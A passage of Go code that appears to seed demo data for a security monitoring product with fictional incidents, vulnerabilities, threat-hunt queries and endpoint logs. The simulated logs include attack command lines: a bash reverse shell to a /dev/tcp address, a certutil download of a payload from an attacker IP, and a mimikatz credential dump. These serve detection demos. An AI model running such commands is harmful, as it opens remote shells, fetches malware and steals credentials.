			ON CONFLICT DO NOTHING`,
			r.name, r.src, r.dst, r.proto, r.port, r.action, r.priority, r.desc, r.group, 0,
		)
	}
	// update hit counts realistically
	mustExec(db, `UPDATE firewall_rules SET hit_count=14832 WHERE name='Block Cobalt Strike C2' AND tenant_id=9999`)
	mustExec(db, `UPDATE firewall_rules SET hit_count=2341 WHERE name='Block Known Exfil Server' AND tenant_id=9999`)
	mustExec(db, `UPDATE firewall_rules SET hit_count=88203 WHERE name='Allow HTTPS' AND tenant_id=9999`)
}

func seedVulnerabilities(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	vulns := []struct {
		agentIdx    int
		pkg         string
		version     string
		cve         string
		severity    string
		cvss        float64
		desc        string
		remediation string
		isKEV       bool
		patchStatus string
		daysAgo     int
	}{
		{0, "openssl", "1.1.1t", "CVE-2024-0727", "high", 7.5, "OpenSSL denial-of-service via malformed PKCS12 file", "Upgrade to openssl >= 3.0.8", false, "open", 45},
		{0, "nginx", "1.18.0", "CVE-2024-7347", "medium", 5.3, "nginx HTTP/3 parsing error allowing memory leak", "Upgrade to nginx >= 1.27.0", false, "open", 12},
		{1, "mysql-server", "8.0.32", "CVE-2024-21096", "high", 8.2, "MySQL privilege escalation via mysqldump", "Upgrade to mysql >= 8.0.37", false, "in_progress", 30},
		{1, "linux-kernel", "5.15.0", "CVE-2024-1086", "critical", 9.8, "Linux kernel use-after-free in netfilter — local privilege escalation", "Apply kernel patch 5.15.149+", true, "open", 60},
		{2, "windows-kernel", "10.0.19041", "CVE-2024-30051", "critical", 9.8, "Windows DWM Core Library privilege escalation — in wild exploitation", "Apply KB5039299 (June 2026 Patch Tuesday)", true, "open", 20},
		{2, "microsoft-office", "16.0.14326", "CVE-2024-30103", "high", 8.8, "Microsoft Outlook RCE via malformed email attachment", "Update to Office 365 build 16827+", true, "in_progress", 15},
		{0, "sudo", "1.9.5p2", "CVE-2023-42465", "high", 7.0, "Sudo rowhammer privilege escalation", "Upgrade sudo >= 1.9.15", false, "open", 90},
		{1, "log4j", "2.14.1", "CVE-2021-44228", "critical", 10.0, "Log4Shell — JNDI remote code execution in logging framework", "Upgrade to log4j >= 2.17.1 immediately", true, "open", 180},
		{3, "android-webkit", "109.0", "CVE-2024-5274", "critical", 8.8, "Chrome/WebKit type confusion — in active exploitation", "Update Android Chrome/WebView", true, "open", 25},
		{0, "openssh", "8.9p1", "CVE-2024-6387", "critical", 8.1, "OpenSSH regreSSHion — unauthenticated RCE in signal handler race", "Upgrade openssh >= 9.8p1", true, "open", 10},
	}
	for _, v := range vulns {
		agentID := agentIDs[v.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO vulnerabilities
				(agent_id, package_name, package_version, cve_id, severity, cvss_score, description, remediation, is_kev, patch_status, detected_at, name, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,9999)`,
			agentID, v.pkg, v.version, v.cve, v.severity, v.cvss, v.desc, v.remediation, v.isKEV, v.patchStatus,
			now.Add(-time.Duration(v.daysAgo)*24*time.Hour),
			v.cve+" "+v.pkg,
		)
	}
}

func seedAssets(db *sql.DB, agentIDs []int) {
	assets := []struct {
		agentIdx    int
		name        string
		hostname    string
		ip          string
		assetType   string
		owner       string
		bunit       string
		criticality string
		dataClass   string
		env         string
		loc         string
	}{
		{0, "Web Production Server", "web-prod-01", "10.0.1.10", "server", "DevOps Team", "Engineering", "critical", "public", "production", "us-east-1"},
		{1, "Database Server", "db-server-02", "10.0.1.20", "database", "Data Engineering", "Engineering", "critical", "confidential", "production", "us-east-1"},
		{2, "Engineering Workstation", "win-workstation-05", "10.0.2.55", "workstation", "User: jdoe", "Engineering", "high", "internal", "production", "HQ-NYC"},
		{3, "Mobile Device — Android", "android-mobile-01", "192.168.1.88", "mobile", "User: asmith", "Sales", "medium", "internal", "production", "Remote"},
		{-1, "Domain Controller", "dc-01", "10.0.1.5", "server", "IT Admin", "IT", "critical", "confidential", "production", "us-east-1"},
		{-1, "Jump Box / Bastion", "bastion-01", "10.0.1.2", "server", "IT Admin", "IT", "high", "internal", "production", "us-east-1"},
		{-1, "SIEM / XCloak Host", "siem-01", "10.0.1.100", "server", "Security Team", "Security", "critical", "confidential", "production", "us-east-1"},
	}
	for _, a := range assets {
		var agentID *int
		if a.agentIdx >= 0 && a.agentIdx < len(agentIDs) {
			id := agentIDs[a.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO assets
				(name, hostname, ip_address, asset_type, owner, business_unit, criticality, data_classification, environment, location, agent_id, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,9999)
			ON CONFLICT DO NOTHING`,
			a.name, a.hostname, a.ip, a.assetType, a.owner, a.bunit, a.criticality, a.dataClass, a.env, a.loc, agentID,
		)
	}
}

func seedCases(db *sql.DB, alertIDs, incidentIDs []int) {
	now := time.Now()
	cases := []struct {
		title, desc, severity, status, phase, mitreTactic, mitreTechnique string
		slaHours                                                            int
		hoursAgo                                                            int
	}{
		{
			"C2 Implant Investigation — web-prod-01", "Active Cobalt Strike beacon detected on web-prod-01. Memory acquisition triggered. Isolating host and hunting for lateral movement.",
			"critical", "open", "containment", "Command and Control", "T1071.001", 4, 1,
		},
		{
			"Credential Theft + Lateral Movement", "mimikatz run on win-workstation-05 extracted NTLM hashes. Pass-the-hash attempt to dc-01 confirmed. AD accounts locked.",
			"high", "investigating", "eradication", "Credential Access", "T1003.001", 8, 3,
		},
		{
			"Ransomware Post-Incident Review", "BlackCat/ALPHV contained. 847 files encrypted on db-server-02. Restoring from backup. CVE-2024-1086 patched.",
			"critical", "resolved", "lessons_learned", "Impact", "T1486", 24, 10,
		},
	}
	for i, c := range cases {
		var caseID int
		err := db.QueryRow(`
			INSERT INTO cases
				(title, description, severity, status, phase, mitre_tactic, mitre_technique, sla_hours, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,9999)
			RETURNING id`,
			c.title, c.desc, c.severity, c.status, c.phase, c.mitreTactic, c.mitreTechnique, c.slaHours,
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
		).Scan(&caseID)
		if err != nil {
			log.Printf("case: %v", err)
			continue
		}
		// Link alert to case
		if i < len(alertIDs) {
			mustExec(db, `INSERT INTO case_alerts (case_id, alert_id) VALUES ($1,$2) ON CONFLICT DO NOTHING`, caseID, alertIDs[i])
		}
	}
}

func seedSuppressionRules(db *sql.DB) {
	rules := []struct {
		name, desc, ruleName, severity, technique string
		windowMins                                 int
	}{
		{"Suppress Low USB Noise", "Suppress low severity USB debugging alerts from Android test devices", "USB Debugging Enabled", "low", "T1562", 1440},
		{"Suppress TLS Negotiation Warnings", "Suppress TLS 1.0 warnings from legacy monitoring systems", "Weak TLS Negotiated", "low", "T1573", 720},
		{"Suppress Resolved Ransomware Alerts", "Ransomware incident resolved — suppress duplicate detection noise", "Ransomware File Pattern", "critical", "T1486", 10080},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO suppression_rules
				(name, description, rule_name, severity, mitre_technique, window_minutes, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,true,9999)
			ON CONFLICT DO NOTHING`,
			r.name, r.desc, r.ruleName, r.severity, r.technique, r.windowMins,
		)
	}
}

func seedQuarantine(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	files := []struct {
		agentIdx       int
		originalPath   string
		quarantinePath string
		fileName       string
		reason         string
	}{
		{0, "/tmp/.hidden/beacon", "/var/xcloak/quarantine/beacon_20260708_c2", "beacon", "Cobalt Strike beacon binary — YARA match: Cobalt_Strike_Beacon"},
		{2, "C:\\Windows\\Temp\\mimikatz.exe", "C:\\xcloak\\quarantine\\mimikatz_20260708", "mimikatz.exe", "Credential theft tool — YARA match: Mimikatz_Generic"},
		{1, "/var/data/.enc_agent", "/var/xcloak/quarantine/enc_agent_20260708", ".enc_agent", "BlackCat ransomware encryptor — YARA match: BlackCat_Ransomware"},
		{3, "/data/app/com.hacker.spyware.apk", "/var/xcloak/quarantine/spyware_20260708.apk", "com.hacker.spyware.apk", "Android spyware — IOC match: com.hacker.spyware"},
	}
	for _, f := range files {
		agentID := agentIDs[f.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO quarantined_files
				(agent_id, original_path, quarantine_path, file_name, reason, tenant_id)
			VALUES ($1,$2,$3,$4,$5,9999)`,
			agentID, f.originalPath, f.quarantinePath, f.fileName, f.reason,
		)
	}
}

func seedNetworkAnomalies(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	anomalies := []struct {
		agentIdx     int
		anomalyType  string
		dstIP        string
		dstPort      int
		proto        string
		score        int
		desc         string
		minsAgo      int
	}{
		{0, "beacon", "185.220.101.47", 443, "tcp", 98, "Periodic HTTPS beacon every 60s — Cobalt Strike jitter profile", 25},
		{0, "exfil", "94.102.49.190", 443, "tcp", 87, "Large data transfer 15 MB outbound — potential exfiltration", 31},
		{2, "lateral_move", "10.0.1.5", 445, "tcp", 82, "SMB connection from workstation to DC — pass-the-hash movement", 120},
		{0, "dns_tunnel", "8.8.8.8", 53, "udp", 76, "Abnormal DNS TXT query volume to evil-domain.xyz — iodine profile", 140},
		{1, "port_scan", "10.0.0.0", 0, "tcp", 70, "Internal port scan originating from db-server-02", 200},
		{3, "c2", "203.0.113.42", 8080, "tcp", 65, "Android device contacting suspicious IP on non-standard port", 380},
	}
	for _, a := range anomalies {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO network_anomalies
				(agent_id, tenant_id, anomaly_type, dst_ip, dst_port, proto, deviation_score, description, detected_at)
			VALUES ($1,9999,$2,$3,$4,$5,$6,$7,$8)`,
			agentID, a.anomalyType, a.dstIP, a.dstPort, a.proto, a.score, a.desc,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
		)
	}
}

func seedUEBA(db *sql.DB, agentIDs []int) {
	now := time.Now()
	events := []struct {
		username    string
		eventType   string
		severity    string
		desc        string
		sourceIP    string
		agentIdx    int
		minsAgo     int
	}{
		{"jdoe", "impossible_travel", "high", "Login from Lagos, Nigeria — user's last login was New York 30 min earlier", "41.184.102.17", 2, 300},
		{"admin", "privilege_escalation", "critical", "Admin account ran mimikatz — credentials likely compromised", "10.0.2.55", 2, 43},
		{"asmith", "off_hours_access", "medium", "User accessed sensitive DB at 03:22 UTC — 4 hours outside normal pattern", "192.168.1.88", 3, 200},
		{"jdoe", "large_download", "high", "15 GB downloaded from internal file server in 2 hours — 8x above baseline", "10.0.2.55", 2, 180},
		{"svc_backdoor", "new_account_activity", "critical", "New service account created and used for network scanning within 5 minutes", "10.0.1.10", 0, 45},
		{"admin", "failed_logins", "medium", "42 failed SSH attempts in 60 seconds from 45.33.32.156", "45.33.32.156", 0, 90},
		{"jdoe", "sensitive_file_access", "high", "Accessed /etc/shadow and /etc/passwd — credential file enumeration", "10.0.2.55", 2, 168},
	}
	for _, e := range events {
		var agentID *int
		if e.agentIdx < len(agentIDs) {
			id := agentIDs[e.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO ueba_events
				(tenant_id, username, event_type, severity, description, source_ip, agent_id, detected_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7)`,
			e.username, e.eventType, e.severity, e.desc, e.sourceIP, agentID,
			now.Add(-time.Duration(e.minsAgo)*time.Minute),
		)
	}

	users := []struct {
		username    string
		riskScore   int
		totalEvents int
		failedLogins int
		offHours    int
		uniqueIPs   int
		privEsc     int
		flags       []string
		lastIP      string
	}{
		{"admin", 89, 142, 42, 3, 5, 2, []string{"compromised_credential", "lateral_movement"}, "10.0.2.55"},
		{"jdoe", 72, 87, 2, 5, 12, 0, []string{"impossible_travel", "large_download"}, "41.184.102.17"},
		{"asmith", 45, 34, 1, 8, 3, 0, []string{"off_hours_access"}, "192.168.1.88"},
		{"svc_backdoor", 95, 28, 0, 0, 2, 1, []string{"new_account", "scanning"}, "10.0.1.10"},
	}
	for _, u := range users {
		mustExec(db, `
			INSERT INTO user_risk_profiles
				(tenant_id, username, risk_score, total_events, failed_logins, off_hours_events, unique_ips, privilege_escalations, flags, last_seen_ip, last_event_at, analyzed_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,now()-interval '30 minutes',now())
			ON CONFLICT DO NOTHING`,
			u.username, u.riskScore, u.totalEvents, u.failedLogins, u.offHours, u.uniqueIPs, u.privEsc,
			pq.Array(u.flags), u.lastIP,
		)
	}
}

func seedInsiderThreat(db *sql.DB) {
	now := time.Now()
	scores := []struct {
		username    string
		score       int
		riskLevel   string
		alertFired  bool
	}{
		{"jdoe", 72, "high", true},
		{"asmith", 45, "medium", false},
		{"admin", 89, "critical", true},
		{"svc_backdoor", 95, "critical", true},
		{"bwilson", 18, "low", false},
		{"cjohnson", 31, "low", false},
	}
	for _, s := range scores {
		contrib := fmt.Sprintf(`{"off_hours":%d,"failed_logins":%d,"data_access":%d}`,
			s.score/4, s.score/5, s.score/3)
		mustExec(db, `
			INSERT INTO insider_threat_scores
				(tenant_id, username, score, risk_level, contributors, alert_fired, score_date, created_at)
			VALUES (9999,$1,$2,$3,$4::jsonb,$5,$6,$7)
			ON CONFLICT DO NOTHING`,
			s.username, s.score, s.riskLevel, contrib, s.alertFired,
			now.AddDate(0, 0, 0).Format("2006-01-02"),
			now,
		)
	}
}

func seedAlertClusters(db *sql.DB, alertIDs []int) {
	clusters := []struct {
		clusterKey, technique, ruleName string
		alertCount                      int
		status                          string
	}{
		{"C2-T1071.001", "T1071.001", "C2 Beacon Detected", 3, "open"},
		{"CRED-T1003.001", "T1003.001", "Credential Dump — LSASS", 2, "investigating"},
		{"RANSOM-T1486", "T1486", "Ransomware File Pattern", 1, "suppressed"},
		{"PERSIST-T1053", "T1053.003", "Suspicious Cron Job", 4, "open"},
		{"LATERA-T1550.002", "T1550.002", "Pass-the-Hash Attempt", 2, "open"},
	}
	for i, c := range clusters {
		var clusterID int
		err := db.QueryRow(`
			INSERT INTO alert_clusters
				(tenant_id, cluster_key, mitre_technique, rule_name, alert_count, status, first_seen, last_seen)
			VALUES (9999,$1,$2,$3,$4,$5,now()-interval '6 hours',now())
			ON CONFLICT DO NOTHING
			RETURNING id`,
			c.clusterKey, c.technique, c.ruleName, c.alertCount, c.status,
		).Scan(&clusterID)
		if err != nil {
			continue
		}
		if i < len(alertIDs) {
			mustExec(db, `
				INSERT INTO alert_cluster_members (cluster_id, alert_id) VALUES ($1,$2) ON CONFLICT DO NOTHING`,
				clusterID, alertIDs[i],
			)
		}
	}
}

func seedJA3(db *sql.DB) {
	fps := []struct {
		hash, threatName, severity, source, desc string
	}{
		{"a0e9f5d64349fb13191bc781f81f42e1", "Cobalt Strike Default", "critical", "threatfox", "Default Cobalt Strike Malleable C2 JA3 hash (769 cipher suite)"},
		{"6734f37431670b3ab4292b8f60f29984", "Metasploit Meterpreter", "critical", "recorded_future", "Metasploit Meterpreter HTTPS stager JA3 fingerprint"},
		{"b386946a5a44d1ddcc843bc75336dfce", "Emotet C2", "high", "abuse_ch", "Emotet banking trojan C2 TLS fingerprint"},
		{"72a589da586844d7f0818ce684948eea", "QakBot", "high", "mandiant", "QakBot/QBot banking malware C2 JA3 fingerprint"},
	}
	for _, f := range fps {
		mustExec(db, `
			INSERT INTO ja3_fingerprints
				(hash, threat_name, severity, source, description, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,true,9999)
			ON CONFLICT DO NOTHING`,
			f.hash, f.threatName, f.severity, f.source, f.desc,
		)
	}
}

func seedCanary(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	tokens := []struct {
		tokenType, name, tokenValue, desc, deployedTo string
		tripCount                                      int
	}{
		{"url", "AWS Credentials Doc", "xck-aws-creds-2026-demo", "Fake AWS credentials document placed in /etc/aws/credentials", "/etc/aws/credentials", 3},
		{"dns", "Internal API Spec DNS Token", "xck-api-spec-internal", "DNS canary token embedded in internal API documentation", "Confluence: API-INTERNAL-v2", 1},
		{"file", "Executive Salary Sheet", "xck-exec-salaries-xlsx", "Canary Excel file in Finance share — detects insider access", "\\\\fileserver\\Finance\\salaries.xlsx", 0},
		{"url", "Database Backup Link", "xck-db-backup-link", "Fake S3 backup link in database config file", "/etc/app/db.conf", 7},
	}
	var tokenIDs []int
	for _, t := range tokens {
		var id int
		err := db.QueryRow(`
			INSERT INTO canary_tokens
				(tenant_id, token_type, name, token_value, description, deployed_to, trip_count, alert_on_trip, is_active)
			VALUES (9999,$1,$2,$3,$4,$5,$6,true,true)
			ON CONFLICT DO NOTHING
			RETURNING id`,
			t.tokenType, t.name, t.tokenValue, t.desc, t.deployedTo, t.tripCount,
		).Scan(&id)
		if err == nil && t.tripCount > 0 {
			tokenIDs = append(tokenIDs, id)
		}
	}
	for i, tokenID := range tokenIDs {
		mustExec(db, `
			UPDATE canary_tokens SET last_tripped_at=$1 WHERE id=$2`,
			now.Add(-time.Duration(i+1)*2*time.Hour), tokenID,
		)
		mustExec(db, `
			INSERT INTO canary_trips
				(token_id, tenant_id, source_ip, user_agent, method, extra_data, tripped_at)
			VALUES ($1,9999,$2,'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','GET','{}', $3)`,
			tokenID, "10.0.2.55", now.Add(-time.Duration(i+1)*2*time.Hour),
		)
	}
}

func seedHunt(db *sql.DB, agentIDs []int) {
	templates := []struct {
		name, desc, tactic, technique, query, schedule string
	}{
		{"C2 Beacon Detection Hunt", "Hunt for periodic outbound connections matching C2 beacon patterns", "Command and Control", "T1071.001", `source="network" | where bytes_out > 1000 AND connection_interval < 120 | stats count by remote_ip | where count > 10`, "@daily"},
		{"LSASS Memory Access Hunt", "Hunt for processes accessing LSASS memory outside of known security tools", "Credential Access", "T1003.001", `source="process" | where target_process="lsass.exe" AND NOT source_process IN ("svchost.exe","antivirus.exe") | table host,source_process,timestamp`, "@hourly"},
		{"Lateral Movement via SMB Hunt", "Detect SMB connections from workstations to servers outside business hours", "Lateral Movement", "T1021.002", `source="network" | where dst_port=445 AND src_type="workstation" AND hour(timestamp) NOT IN (8..18) | table src_ip,dst_ip,timestamp`, "@hourly"},
		{"PowerShell Encoded Command Hunt", "Hunt for base64-encoded PowerShell payloads across all endpoints", "Execution", "T1059.001", `source="process" | where process_name="powershell.exe" AND cmdline MATCHES "-[Ee][Nn][Cc]" | table host,cmdline,user,timestamp`, "@daily"},
		{"Persistence via Scheduled Tasks", "Detect newly created scheduled tasks with suspicious executables", "Persistence", "T1053.005", `source="event" | where event_id=4698 AND task_content MATCHES "(cmd.exe|powershell.exe|wscript.exe)" | table host,task_name,timestamp`, "@daily"},
	}
	var templateIDs []int
	for _, t := range templates {
		var id int
		err := db.QueryRow(`
			INSERT INTO hunt_templates
				(tenant_id, name, description, mitre_tactic, mitre_technique, kql_query, schedule, is_active, created_by)
			VALUES (9999,$1,$2,$3,$4,$5,$6,true,'demo-seeder')
			ON CONFLICT DO NOTHING
			RETURNING id`,
			t.name, t.desc, t.tactic, t.technique, t.query, t.schedule,
		).Scan(&id)
		if err == nil {
			templateIDs = append(templateIDs, id)
		}
	}

	runs := []struct {
		tmplIdx  int
		name     string
		status   string
		hitCount int
		analyst  string
		hoursAgo int
	}{
		{0, "C2 Hunt — July 8 2026", "completed", 14, "analyst-1", 2},
		{1, "LSASS Hunt — Daily", "completed", 3, "analyst-2", 6},
		{2, "SMB Lateral Movement — Overnight", "completed", 8, "analyst-1", 12},
		{3, "PowerShell Sweep", "running", 0, "analyst-3", 0},
	}
	now := time.Now()
	for _, r := range runs {
		tmplID := 0
		if r.tmplIdx < len(templateIDs) {
			tmplID = templateIDs[r.tmplIdx]
		}
		var completedAt interface{}
		if r.status == "completed" {
			completedAt = now.Add(-time.Duration(r.hoursAgo-1) * time.Hour)
		}
		findings := `[{"ip":"185.220.101.47","count":14,"severity":"critical"}]`
		mustExec(db, `
			INSERT INTO hunt_runs
				(template_id, tenant_id, name, kql_query, status, hit_count, findings, analyst, severity, started_at, completed_at)
			VALUES ($1,9999,$2,'source=network | stats count',$3,$4,$5::jsonb,$6,'high',$7,$8)`,
			tmplID, r.name, r.status, r.hitCount, findings, r.analyst,
			now.Add(-time.Duration(r.hoursAgo)*time.Hour), completedAt,
		)
	}
}

func seedEndpointLogs(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	logs := []struct {
		agentIdx  int
		logSource string
		message   string
		minsAgo   int
	}{
		{0, "syslog", `Jul 8 17:10:04 web-prod-01 sshd[5820]: Accepted publickey for root from 185.220.101.47 port 44521 ssh2`, 5},
		{0, "syslog", `Jul 8 17:09:12 web-prod-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.1.10 PROTO=TCP DPT=22`, 6},
		{0, "syslog", `Jul 8 17:05:33 web-prod-01 sudo: root : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/usr/sbin/python3 c2client.py`, 10},
		{0, "auditd", `type=EXECVE msg=audit(1720447200.001:1234): argc=4 a0="bash" a1="-i" a2=">&" a3="/dev/tcp/192.168.1.99/4444"`, 15},
		{0, "auditd", `type=SYSCALL msg=audit(1720447200.002:1235): arch=c000003e syscall=59 success=yes exe="/usr/sbin/python3"`, 15},
		{1, "syslog", `Jul 8 16:45:01 db-server-02 cron[4521]: (www-data) CMD (/tmp/.hidden/beacon)`, 40},
		{1, "mysql", `2026-07-08T16:30:22.123 [ERROR] Access denied for user 'root'@'10.0.2.55' (using password: YES) -- 42 attempts`, 45},
		{1, "syslog", `Jul 8 16:00:11 db-server-02 kernel: EXT4-fs error (device sdb1): ext4_find_entry:1455: inode #2: comm tar: reading directory lblock 0`, 75},
		{2, "winevent", `EventID=4624 Account=Administrator Source=10.0.2.55 LogonType=3 AuthPkg=NTLM ComputerName=dc-01`, 90},
		{2, "winevent", `EventID=4688 Process=mimikatz.exe CommandLine="mimikatz.exe privilege::debug sekurlsa::logonpasswords" User=Administrator`, 43},
		{2, "winevent", `EventID=4698 TaskName=\WindowsUpdate_Helper Action=cmd.exe /c certutil -urlcache -split -f http://185.220.101.47/payload.exe`, 200},
		{2, "winevent", `EventID=1102 Log=Security Source=EventLog-WinRM Message="The audit log was cleared." User=SYSTEM`, 220},
		{3, "android", `07-08 14:22:11.234 W/PackageManager: Attempting to install com.hacker.spyware from unknown source`, 260},
		{3, "android", `07-08 14:20:05.123 I/adb: USB debugging enabled on device android-mobile-01`, 262},
	}
	for _, l := range logs {
		agentID := agentIDs[l.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_logs (agent_id, tenant_id, log_source, log_message, collected_at)
			VALUES ($1,9999,$2,$3,$4)`,
			agentID, l.logSource, l.message,
			now.Add(-time.Duration(l.minsAgo)*time.Minute),
		)
	}
}

func seedLogSources(db *sql.DB, agentIDs []int) {
	sources := []struct {
		name, srcType, deviceType, format string
		agentIdx                          int
		eventCount                        int
	}{
		{"web-prod-01 syslog", "syslog", "linux_server", "syslog", 0, 48231},
		{"db-server-02 syslog", "syslog", "linux_server", "syslog", 1, 31045},
		{"win-workstation-05 WinEvent", "winevent", "windows_workstation", "evtx", 2, 22890},
		{"android-mobile-01 logcat", "android", "android_device", "json", 3, 5421},
		{"Palo Alto NGFW", "syslog", "firewall", "cef", -1, 182450},
		{"AWS CloudTrail", "api", "cloud", "json", -1, 74231},
		{"Nginx Access Logs", "flatfile", "web_server", "combined", 0, 94520},
		{"MySQL Slow Query Log", "flatfile", "database", "plaintext", 1, 2341},
	}
	for _, s := range sources {
		var agentID *int
		if s.agentIdx >= 0 && s.agentIdx < len(agentIDs) {
			id := agentIDs[s.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO log_sources
				(tenant_id, name, source_type, device_type, format, agent_id, enabled, event_count, last_event)
			VALUES (9999,$1,$2,$3,$4,$5,true,$6,now()-interval '2 minutes')
			ON CONFLICT DO NOTHING`,
			s.name, s.srcType, s.deviceType, s.format, agentID, s.eventCount,
		)
	}
}

func seedNetworkConnections(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	conns := []struct {
		agentIdx    int
		proto       string
		local       string
		remote      string
		state       string
		country     string
		countryCode string
		bytesSent   int64
		bytesRecv   int64
	}{
		{0, "tcp", "10.0.1.10:52341", "185.220.101.47:443", "ESTABLISHED", "Germany", "DE", 42000, 8100},
		{0, "tcp", "10.0.1.10:80", "10.0.2.55:51234", "ESTABLISHED", "Internal", "INT", 1024, 2048},
		{0, "tcp", "10.0.1.10:22", "10.0.1.5:44521", "ESTABLISHED", "Internal", "INT", 512, 1024},
		{0, "tcp", "10.0.1.10:53412", "94.102.49.190:443", "TIME_WAIT", "Russia", "RU", 15728640, 102400},
		{1, "tcp", "10.0.1.20:3306", "10.0.2.55:34521", "ESTABLISHED", "Internal", "INT", 20480, 102400},
		{1, "tcp", "10.0.1.20:22", "10.0.1.5:54321", "ESTABLISHED", "Internal", "INT", 1024, 512},
		{2, "tcp", "10.0.2.55:445", "10.0.1.5:58921", "ESTABLISHED", "Internal", "INT", 1048576, 2097152},
		{2, "tcp", "10.0.2.55:3389", "10.0.1.5:3389", "LISTEN", "Internal", "INT", 0, 0},
		{3, "tcp", "192.168.1.88:58321", "203.0.113.42:8080", "ESTABLISHED", "China", "CN", 8192, 32768},
	}
	for _, c := range conns {
		agentID := agentIDs[c.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_connections
				(agent_id, protocol, local_address, remote_address, state, country, country_code, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)`,
			agentID, c.proto, c.local, c.remote, c.state, c.country, c.countryCode, now,
		)
		mustExec(db, `
			INSERT INTO network_connect_events
				(agent_id, tenant_id, comm, protocol, local_address, remote_address, state, bytes_sent, bytes_recv, created_at)
			VALUES ($1,9999,'nginx',$2,$3,$4,$5,$6,$7,$8)`,
			agentID, c.proto, c.local, c.remote, c.state, c.bytesSent, c.bytesRecv, now,
		)
	}
}

func seedRiskPosture(db *sql.DB) {
	now := time.Now()
	snapshots := []struct {
		score, vuln, ueba, alert, ioc int
		daysAgo                       int
	}{
		{82, 30, 20, 25, 7, 30},
		{78, 32, 22, 18, 6, 25},
		{75, 35, 25, 12, 3, 20},
		{71, 38, 28, 15, 5, 15},
		{68, 36, 32, 20, 8, 10},
		{72, 33, 28, 22, 10, 5},
		{69, 35, 30, 24, 12, 2},
		{49, 40, 35, 35, 15, 0},
	}
	assetScores := `[{"name":"web-prod-01","score":55},{"name":"db-server-02","score":48},{"name":"win-workstation-05","score":35}]`
	for _, s := range snapshots {
		mustExec(db, `
			INSERT INTO risk_posture_snapshots
				(tenant_id, score, vuln_score, ueba_score, alert_score, ioc_score, asset_scores, snapshot_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6::jsonb,$7)`,
			s.score, s.vuln, s.ueba, s.alert, s.ioc, assetScores,
			now.AddDate(0, 0, -s.daysAgo),
		)
	}
}

func seedITDR(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	findings := []struct {
		findingType, severity, identity, idType, srcIP, desc, technique, status string
		agentIdx                                                                  int
		minsAgo                                                                   int
	}{
		{"credential_theft", "critical", "admin", "user", "10.0.2.55", "Admin credentials extracted via mimikatz — NTLM hash captured", "T1003.001", "open", 2, 43},
		{"lateral_movement", "high", "jdoe", "user", "10.0.2.55", "Pass-the-hash lateral movement from workstation to DC detected", "T1550.002", "investigating", 2, 120},
		{"impossible_travel", "high", "jdoe", "user", "41.184.102.17", "Login from Nigeria 30 minutes after New York login — impossible travel", "T1078", "open", 2, 300},
		{"privilege_escalation", "critical", "svc_backdoor", "service_account", "10.0.1.10", "New service account created and immediately used for network scanning", "T1078.003", "open", 0, 45},
		{"brute_force", "medium", "admin", "user", "45.33.32.156", "42 failed SSH attempts in 60 seconds from external IP", "T1110.001", "resolved", 0, 90},
		{"account_compromise", "critical", "admin", "user", "10.0.2.55", "Admin account accessed LSASS and created new backdoor user svc_backdoor", "T1003.001", "open", 2, 43},
	}
	for _, f := range findings {
		agentID := agentIDs[f.agentIdx%len(agentIDs)]
		evidence := fmt.Sprintf(`{"alert_ids":[1,2,3],"host":"%s"}`, "10.0.2.55")
		dedup := fmt.Sprintf("itdr-%s-%s", f.findingType, f.identity)
		mustExec(db, `
			INSERT INTO itdr_findings
				(tenant_id, finding_type, severity, identity, identity_type, source_ip, description, evidence, mitre_technique, status, agent_id, dedup_key, created_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7::jsonb,$8,$9,$10,$11,$12)
			ON CONFLICT DO NOTHING`,
			f.findingType, f.severity, f.identity, f.idType, f.srcIP, f.desc,
			evidence, f.technique, f.status, agentID, dedup,
			now.Add(-time.Duration(f.minsAgo)*time.Minute),
		)
	}
}

func seedDFIR(db *sql.DB, agentIDs, incidentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	collections := []struct {
		agentIdx      int
		incidentIdx   int
		label         string
		status        string
		triggeredBy   string
		artifactTypes string
		hoursAgo      int
	}{
		{0, 0, "C2 Implant Forensic Collection — web-prod-01", "completed", "auto-soar", `{"memory","processes","network","files"}`, 1},
		{2, 1, "Credential Theft Collection — win-workstation-05", "completed", "analyst-2", `{"memory","registry","event_logs"}`, 3},
		{1, 2, "Ransomware DFIR — db-server-02", "completed", "auto-soar", `{"memory","files","network","event_logs"}`, 8},
	}
	for i, c := range collections {
